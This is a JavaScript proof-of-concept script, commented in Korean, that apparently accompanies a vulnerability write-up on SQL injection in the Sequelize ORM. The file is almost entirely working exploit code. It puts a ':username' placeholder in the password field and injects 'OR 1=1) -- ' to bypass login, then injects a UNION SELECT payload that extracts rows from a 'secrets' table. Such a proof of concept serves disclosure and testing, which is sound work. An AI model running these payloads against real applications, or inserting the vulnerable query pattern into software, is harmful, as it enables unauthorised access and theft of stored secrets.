// poc1_login.js
// 기능1: 로그인 인증 우회 테스트 진행
// 실행: node poc1_login.js (별도 서버 실행 불필요)

const { Sequelize, Op } = require('sequelize');
const { sequelize, User } = require('./models');

async function main() {
  console.log('===== 로그인 테스트 =====');

// 정상 동작 확인: 잘못된 비밀번호로 로그인 시도 (실패해야 정상)
  let rows = await User.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`username = :username`),
        { password: 'wrongpw' },
      ],
    },
    replacements: { username: 'tae-hyun' },
  });
  console.log('정상케이스(비번틀림) -> 결과 ' + rows.length + '건 (0건이어야 정상)');

// 여기서부터 실제 공격 시도
// username 자리에 OR 1=1, password 자리에 문자열 ":username"을 그대로 넣으면 인증을 우회할 수 있음
// 발생 원리는 "2. POC 원리 자세한 설명"에서 별도로 다룸
  rows = await User.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`username = :username`),
        { password: ':username' },
      ],
    },
    replacements: { username: 'OR 1=1) -- ' },
  });
  console.log('공격케이스(인증우회) -> 결과 ' + rows.length + '건');
  console.log(rows.map((r) => ({ username: r.username, password: r.password }))); // 중요하지 않은 항목에 대해서는 제거

// 인증 우회에 성공한 김에, UNION Injection으로 secrets 테이블 데이터도 추출 가능한지 확인
// users 테이블 컬럼이 5개(id, username, password, createdAt, updatedAt)이므로 UNION SELECT도 컬럼 개수를 5개로 맞춰야 에러 없이 실행됨
  rows = await User.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`username = :username`),
        { password: ':username' },
      ],
    },
    replacements: {
      username: ') UNION SELECT id, label, value, createdAt, updatedAt FROM secrets -- ',
    },
  });
  console.log('공격케이스(secrets 테이블 탈취) -> 결과 ' + rows.length + '건');
  console.log(rows.map((r) => ({ username: r.username, password: r.password })));

  await sequelize.close();
}

main().catch((err) => {
  console.log('에러남', err);
  process.exit(1);
});
